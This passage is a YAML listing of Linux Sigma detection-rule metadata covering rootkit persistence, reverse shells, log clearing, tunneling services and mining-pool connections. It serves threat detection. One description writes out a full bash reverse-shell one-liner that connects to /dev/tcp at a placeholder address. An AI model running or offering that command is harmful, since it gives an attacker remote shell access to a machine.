- detection_id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
  name: Equation Group Indicators
  description: Detects suspicious shell commands used in various Equation Group scripts
    and tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.g0020
  - attack.t1059.004
  time_window: ''
  references:
  - https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 18b042f0-2ecd-4b6e-9f8d-aa7a7e7de781
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_buffer_overflows.yml
  name: Buffer Overflow Attempts
  description: Detects buffer overflow attempts in Unix system log files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.t1068
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://github.com/ossec/ossec-hids/blob/1ecffb1b884607cb12e619f9ab3c04f530801083/etc/rules/attack_rules.xml
  - https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatd/index.html
  - https://www.giac.org/paper/gcih/266/review-ftp-protocol-cyber-defense-initiative/102802
  - https://blu.org/mhonarc/discuss/2001/04/msg00285.php
  - https://rapid7.com/blog/post/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/
  false_positives:
  - Base64 encoded data in log entries
  notes: ''
- detection_id: e09eb557-96d2-4de9-ba2d-30f712a5afd3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_clear_syslog.yml
  name: Commands to Clear or Remove the Syslog - Builtin
  description: Detects specific commands commonly used to remove or empty the syslog
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1565.001
  tags:
  - attack.impact
  - attack.t1565.001
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/fc614fb4bda24ae8ca2c44e812d12c0fab6dd7a097472a35dd12ded053ab8474
  false_positives:
  - Log rotation
  notes: ''
- detection_id: 7a14080d-a048-4de8-ae58-604ce58a795b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_file_copy.yml
  name: Remote File Copy
  description: Detects the use of tools that copy files from or to remote systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: stable
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.lateral-movement
  - attack.t1105
  time_window: ''
  references:
  - https://www.cisa.gov/stopransomware/ransomware-guide
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 7e3c4651-c347-40c4-b1d4-d48590fdf684
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_ldso_preload_injection.yml
  name: Code Injection by ld.so Preload
  description: Detects the ld.so preload persistence file. See `man ld.so` for more
    information.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.006
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.006
  time_window: ''
  references:
  - https://man7.org/linux/man-pages/man8/ld.so.8.html
  false_positives:
  - Rare temporary workaround for library misconfiguration
  notes: ''
- detection_id: 0fadd880-6af3-4610-b1e5-008dc3a11b8a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_potential_susp_ebpf_activity.yml
  name: Potential Suspicious BPF Activity - Linux
  description: Detects the presence of "bpf_probe_write_user" BPF helper-generated
    warning messages. Which could be a sign of suspicious eBPF activity on the system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/ebpf-malware/
  - https://man7.org/linux/man-pages/man7/bpf-helpers.7.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0ac15ec3-d24f-4246-aa2a-3077bb1cf90e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_privileged_user_creation.yml
  name: Privileged User Has Been Created
  description: Detects the addition of a new user to a privileged group such as "root"
    or "sudo"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  - T1136.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1136.001
  - attack.t1098
  time_window: ''
  references:
  - https://digital.nhs.uk/cyber-alerts/2018/cc-2825
  - https://linux.die.net/man/8/useradd
  - https://github.com/redcanaryco/atomic-red-team/blob/25acadc0b43a07125a8a5b599b28bbc1a91ffb06/atomics/T1136.001/T1136.001.md#atomic-test-5---create-a-new-user-in-linux-with-root-uid-and-gid
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
  name: Linux Command History Tampering
  description: 'Detects commands that try to clear or tamper with the Linux command
    history.

    This technique is used by threat actors in order to evade defenses and execute
    commands without them being recorded in files such as "bash_history" or "zsh_history".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.003/T1070.003.md
  - https://www.hackers-arise.com/post/2016/06/20/covering-your-bash-shell-tracks-antiforensics
  - https://www.cadosecurity.com/spinning-yarn-a-new-linux-malware-campaign-targets-docker-apache-hadoop-redis-and-confluence/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_shell_susp_commands.yml
  name: Suspicious Activity in Shell Commands
  description: Detects suspicious shell commands used in various exploit codes (see
    references)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  time_window: ''
  references:
  - https://web.archive.org/web/20170319121015/http://www.threatgeek.com/2017/03/widespread-exploitation-attempts-using-cve-2017-5638.html
  - https://github.com/rapid7/metasploit-framework/blob/eb6535009f5fdafa954525687f09294918b5398d/modules/exploits/multi/http/struts_code_exec_exception_delegator.rb
  - http://pastebin.com/FtygZ1cg
  - https://artkond.com/2017/03/23/pivoting-guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f64b6e9a-5d9d-48a5-8289-e1dd2b3876e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_shell_susp_log_entries.yml
  name: Suspicious Log Entries
  description: Detects suspicious log entries in Linux log files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://github.com/ossec/ossec-hids/blob/f6502012b7380208db81f82311ad4a1994d39905/etc/rules/syslog_rules.xml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
  name: Suspicious Reverse Shell Command Line
  description: Detects suspicious shell commands or program code that may be executed
    or used in command line to establish a reverse shell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  time_window: ''
  references:
  - https://alamot.github.io/reverse_shells/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c67e0c98-4d39-46ee-8f6b-437ebf6b950e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_shellshock.yml
  name: Shellshock Expression
  description: Detects shellshock expressions in log files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_susp_dev_tcp.yml
  name: Suspicious Use of /dev/tcp
  description: Detects suspicious command with /dev/tcp
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Reconnaissance
  techniques: []
  tags:
  - attack.reconnaissance
  time_window: ''
  references:
  - https://www.andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/
  - https://book.hacktricks.xyz/shells/shells/linux
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md#atomic-test-1---port-scan
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8ec2c8b4-557a-4121-b87c-5dfb3a602fae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_susp_jexboss.yml
  name: JexBoss Command Sequence
  description: Detects suspicious command sequence that JexBoss
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  time_window: ''
  references:
  - https://www.us-cert.gov/ncas/analysis-reports/AR18-312A
  false_positives:
  - Unknown
  notes: ''
- detection_id: c67fc22a-0be5-4b4f-aad5-2b32c4b69523
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/lnx_symlink_etc_passwd.yml
  name: Symlink Etc Passwd
  description: Detects suspicious command lines that look as if they would create
    symbolic links to /etc/passwd
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.001
  tags:
  - attack.t1204.001
  - attack.execution
  time_window: ''
  references:
  - https://www.qualys.com/2021/05/04/21nails/21nails.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: e76b413a-83d0-4b94-8e4c-85db4a5b8bdc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/sshd/lnx_sshd_susp_ssh.yml
  name: Suspicious OpenSSH Daemon Error
  description: Detects suspicious SSH / SSHD error messages that indicate a fatal
    or suspicious error that could be caused by exploiting attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: sshd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://github.com/openssh/openssh-portable/blob/c483a5c0fb8e8b8915fad85c5f6113386a4341ca/ssherr.c
  - https://github.com/ossec/ossec-hids/blob/1ecffb1b884607cb12e619f9ab3c04f530801083/etc/rules/sshd_rules.xml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 49f5dfc1-f92e-4d34-96fa-feba3f6acf36
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/syslog/lnx_syslog_security_tools_disabling_syslog.yml
  name: Disabling Security Tools - Builtin
  description: Detects disabling security tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: syslog
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: c8e35e96-19ce-4f16-aeb6-fd5588dc5365
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/syslog/lnx_syslog_susp_named.yml
  name: Suspicious Named Error
  description: Detects suspicious DNS error messages that indicate a fatal or suspicious
    error that could be caused by exploiting attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: syslog
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://github.com/ossec/ossec-hids/blob/1ecffb1b884607cb12e619f9ab3c04f530801083/etc/rules/named_rules.xml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 377f33a1-4b36-4ee1-acee-1dbe4b43cfbe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/vsftpd/lnx_vsftpd_susp_error_messages.yml
  name: Suspicious VSFTPD Error Messages
  description: Detects suspicious VSFTPD error messages that indicate a fatal or suspicious
    error that could be caused by exploiting attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: vsftpd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://github.com/dagwieers/vsftpd/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 00eee2a5-fdb0-4746-a21d-e43fbdea5681
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_doas_conf_creation.yml
  name: Linux Doas Conf File Creation
  description: Detects the creation of doas.conf file in linux host platform.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: stable
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - https://research.splunk.com/endpoint/linux_doas_conf_file_creation/
  - https://www.makeuseof.com/how-to-install-and-use-doas/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6c4e2f43-d94d-4ead-b64d-97e53fa2bd05
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_persistence_cron_files.yml
  name: Persistence Via Cron Files
  description: Detects creation of cron file or files in Cron directories which could
    indicates potential persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.003
  time_window: ''
  references:
  - https://github.com/microsoft/MSTIC-Sysmon/blob/f1477c0512b0747c1455283069c21faec758e29d/linux/configs/attack-based/persistence/T1053.003_Cron_Activity.xml
  false_positives:
  - Any legitimate cron file.
  notes: ''
- detection_id: ddb26b76-4447-4807-871f-1b035b2bfa5d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_persistence_sudoers_files.yml
  name: Persistence Via Sudoers Files
  description: Detects creation of sudoers file or files in "sudoers.d" directory
    which can be used a potential method to persiste privileges for a specific user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.003
  time_window: ''
  references:
  - https://github.com/h3xduck/TripleCross/blob/1f1c3e0958af8ad9f6ebe10ab442e75de33e91de/apps/deployer.sh
  false_positives:
  - Creation of legitimate files in sudoers.d folder part of administrator work
  notes: ''
- detection_id: 179b3686-6271-4d87-807d-17d843a8af73
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_susp_filename_with_embedded_base64_command.yml
  name: Suspicious Filename with Embedded Base64 Commands
  description: 'Detects files with specially crafted filenames that embed Base64-encoded
    bash payloads designed to execute when processed by shell scripts.

    These filenames exploit shell interpretation quirks to trigger hidden commands,
    a technique observed in VShell malware campaigns.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://www.trellix.com/blogs/research/the-silent-fileless-threat-of-vshell/
  false_positives:
  - Legitimate files with similar naming patterns (very unlikely).
  notes: ''
- detection_id: 13f08f54-e705-4498-91fd-cce9d9cee9f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_susp_shell_script_under_profile_directory.yml
  name: Potentially Suspicious Shell Script Creation in Profile Folder
  description: Detects the creation of shell scripts under the "profile.d" path.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Legitimate shell scripts in the "profile.d" directory could be common in your
    environment. Apply additional filter accordingly via "image", by adding specific
    filenames you "trust" or by correlating it with other events.
  - Regular file creation during system update or software installation by the package
    manager
  notes: ''
- detection_id: c0239255-822c-4630-b7f1-35362bcb8f44
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_triple_cross_rootkit_lock_file.yml
  name: Triple Cross eBPF Rootkit Default LockFile
  description: Detects the creation of the file "rootlog" which is used by the TripleCross
    rootkit as a way to check if the backdoor is already running.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://github.com/h3xduck/TripleCross/blob/1f1c3e0958af8ad9f6ebe10ab442e75de33e91de/src/helpers/execve_hijack.c#L33
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1a2ea919-d11d-4d1e-8535-06cda13be20f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_triple_cross_rootkit_persistence.yml
  name: Triple Cross eBPF Rootkit Default Persistence
  description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d"
    directories. Which both are related to the TripleCross persistence method
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.defense-evasion
  - attack.t1053.003
  time_window: ''
  references:
  - https://github.com/h3xduck/TripleCross/blob/12629558b8b0a27a5488a0b98f1ea7042e76f8ab/apps/deployer.sh
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 35a05c60-9012-49b6-a11f-6bab741c9f74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/file_event/file_event_lnx_wget_download_file_in_tmp_dir.yml
  name: Wget Creating Files in Tmp Directory
  description: Detects the use of wget to download content in a temporary directory
    such as "/tmp" or "/var/tmp"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Legitimate downloads of files in the tmp folder.
  notes: ''
- detection_id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
  name: Linux Reverse Shell Indicator
  description: Detects a bash contecting to a remote IP address (often found when
    actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: linux
  product: linux
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  time_window: ''
  references:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: a46c93b7-55ed-4d27-a41b-c259456c4746
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml
  name: Linux Crypto Mining Pool Connections
  description: Detects process connections to a Monero crypto mining pool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: stable
  platform: linux
  product: linux
  category: network_connection
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1496
  tags:
  - attack.impact
  - attack.t1496
  time_window: ''
  references:
  - https://www.poolwatch.io/coin/monero
  false_positives:
  - Legitimate use of crypto miners
  notes: ''
- detection_id: c4568f5d-131f-4e78-83d4-45b2da0ec4f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml
  name: Communication To LocaltoNet Tunneling Service Initiated - Linux
  description: 'Detects an executable initiating a network connection to "LocaltoNet"
    tunneling sub-domains.

    LocaltoNet is a reverse proxy that enables localhost services to be exposed to
    the Internet.

    Attackers have been seen to use this service for command-and-control activities
    to bypass MFA and perimeter controls.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: linux
  product: linux
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1090
  - T1102
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  - attack.t1090
  - attack.t1102
  time_window: ''
  references:
  - https://localtonet.com/documents/supported-tunnels
  - https://cloud.google.com/blog/topics/threat-intelligence/unc3944-targets-saas-applications
  false_positives:
  - Legitimate use of the LocaltoNet service.
  notes: ''
- detection_id: 19bf6fdb-7721-4f3d-867f-53467f6a5db6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml
  name: Communication To Ngrok Tunneling Service - Linux
  description: Detects an executable accessing an ngrok tunneling endpoint, which
    could be a sign of forbidden exfiltration of data exfiltration by malicious actors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1090
  - T1102
  - T1567
  - T1568.002
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1568.002
  - attack.t1572
  - attack.t1090
  - attack.t1102
  - attack.s0508
  time_window: ''
  references:
  - https://twitter.com/hakluke/status/1587733971814977537/photo/1
  - https://ngrok.com/docs/secure-tunnels/tunnels/ssh-reverse-tunnel-agent
  false_positives:
  - Legitimate use of ngrok
  notes: ''
- detection_id: dbfc7c98-04ab-4ab7-aa94-c74d22aa7376
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml
  name: Potentially Suspicious Malware Callback Communication - Linux
  description: 'Detects programs that connect to known malware callback ports based
    on threat intelligence reports.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: network_connection
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1571
  tags:
  - attack.persistence
  - attack.command-and-control
  - attack.t1571
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/triton-actor-ttp-profile-custom-attack-tools-detections
  - https://www.mandiant.com/resources/blog/ukraine-and-sandworm-team
  - https://www.elastic.co/guide/en/security/current/potential-non-standard-port-ssh-connection.html
  - https://thehackernews.com/2024/01/systembc-malwares-c2-server-analysis.html
  - https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
  false_positives:
  - Unknown
  notes: ''
- detection_id: bb382fd5-b454-47ea-a264-1828e4c766d6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_apt_shell_execution.yml
  name: Shell Invocation via Apt - Linux
  description: 'Detects the use of the "apt" and "apt-get" commands to execute a shell
    or proxy commands.

    Such behavior may be associated with privilege escalation, unauthorized command
    execution, or to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/apt/
  - https://gtfobins.github.io/gtfobins/apt-get/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d2d642d7-b393-43fe-bae4-e81ed5915c4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_at_command.yml
  name: Scheduled Task/Job At
  description: 'Detects the use of at/atd which are utilities that are used to schedule
    tasks.

    They are often abused by adversaries to maintain persistence or to perform task
    scheduling for initial or recurring execution of malicious code

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: stable
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.002
  tags:
  - attack.privilege-escalation
  - attack.execution
